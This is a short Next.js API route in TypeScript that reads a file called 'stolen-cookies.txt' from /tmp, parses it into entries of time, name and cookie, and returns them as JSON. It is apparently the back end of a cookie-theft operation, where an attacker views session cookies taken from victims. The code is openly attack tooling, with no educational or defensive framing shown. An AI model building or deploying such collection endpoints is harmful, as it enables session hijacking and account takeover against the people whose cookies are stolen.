import { NextResponse } from "next/server";
import fs from "fs";
import path from "path";

type Entry = { time: string; name: string; cookie: unknown };

export async function GET() {
  try {
    // const logPath = path.join(process.cwd(), "public/stolen-cookies.txt");
    const logPath = path.join("/tmp", "stolen-cookies.txt");

    if (!fs.existsSync(logPath)) {
      return NextResponse.json({ data: [] });
    }

    const content = fs.readFileSync(logPath, "utf8");

    const entries: Entry[] = content
      .split("\n")
      .filter(Boolean)
      .map((line) => {
        try {
          return JSON.parse(line);
        } catch {
          return null;
        }
      })
      .filter((x): x is Entry => !!x);

    return NextResponse.json({ data: entries });
  } catch (error) {
    return NextResponse.json(
      { error: "Failed to read file" },
      { status: 500 }
    );
  }
}